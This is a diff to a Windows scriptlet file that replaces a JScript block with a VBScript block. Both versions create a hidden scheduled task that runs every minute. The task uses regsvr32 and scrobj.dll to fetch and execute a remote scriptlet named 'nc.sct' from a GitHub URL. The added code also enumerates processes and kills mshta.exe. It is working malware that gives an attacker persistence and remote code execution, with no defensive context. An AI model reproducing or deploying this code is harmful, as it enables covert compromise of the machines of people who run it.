@@ -10,13 +10,24 @@
 	>
 </registration>
 
-<script language="JScript">
-<![CDATA[
-
-		var r = new ActiveXObject("WScript.Shell").Run("powershell.exe SchTasks /Create /SC MINUTE /TN x /TR ’regsvr32 /s /n /u /i:https://raw.githubusercontent.com/riyantigomez/gomez22/master/nc.sct scrobj.dll’ /f");
-	
-	
-]]>
+<script language="VBScript">
+		<![CDATA[
+		
+		 Set ws=CreateObject("WScript.Shell")
+ws.Run "powershell.exe SchTasks /Create /SC MINUTE /TN x /TR ’regsvr32 /s /n /u /i:https://raw.githubusercontent.com/riyantigomez/gomez22/master/nc.sct scrobj.dll’ /f", 0, vbhide
+ 
+Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+Dim colProcesses : Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process")
+Dim objProcess
+For Each objProcess In colProcesses    
+    if (objProcess.name = "mshta.exe") then
+        Set objShell = CreateObject("WScript.Shell")
+        strCmd="TaskKill /f /im " & objProcess.name 
+        objShell.Run strCmd,0,True
+    end if
+Next
+    
+		]]>
 </script>
 
 </scriptlet>
